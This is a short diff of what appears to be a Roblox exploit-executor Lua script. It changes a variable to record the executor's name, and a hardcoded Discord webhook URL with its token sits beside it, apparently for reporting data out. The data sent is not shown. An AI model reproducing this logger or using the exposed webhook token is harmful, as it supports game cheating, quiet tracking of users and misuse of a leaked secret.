@@ -4,7 +4,7 @@ local Asset = game:GetService("MarketplaceService"):GetProductInfo(placeId)
 
 -----------------------------------Webhook-----------------------------------
 
-local webhookcheck = "UWP Roblox"
+local webhookcheck = identifyexecutor and table.concat({ identifyexecutor() }, " ") or "Unknown";
 
 local url = "https://discord.com/api/webhooks/1090380292080025722/lJYNg4SNr85IhZC-K0itiGgBSsJz2kS9nu2mrDskVNGxcjyn18aljZvPW0sbA2-2RHrn"
 local data = {
